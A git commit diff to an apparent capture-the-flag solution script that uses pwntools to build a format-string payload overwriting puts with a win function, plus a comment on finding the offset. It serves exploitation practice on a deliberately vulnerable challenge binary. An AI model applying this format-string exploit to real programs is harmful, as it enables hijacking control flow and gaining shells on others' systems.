59a44c5d3e0496b6655c2876bb3292277efbf695
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-04-18 19:23:27 -0400

    Update 11.py

--- chall_11/11.py
+++ chall_11/11.py
@@ -8,7 +8,10 @@ offset = 11
 payload = fmtstr_payload(offset,{binary.sym.puts:binary.sym.win})
 p.sendline(payload)
 
-#null = payload.find(b'\x00')
-#p.recvuntil(payload[null-3:null])
+null = payload.find(b'\x00')
+p.recvuntil(payload[null-3:null])
 
-#p.interactive()
+p.interactive()
+
+
+#Sending $p until you get the the same value as the input. This will give you the offset. After the offset you need to swape puts with win. 
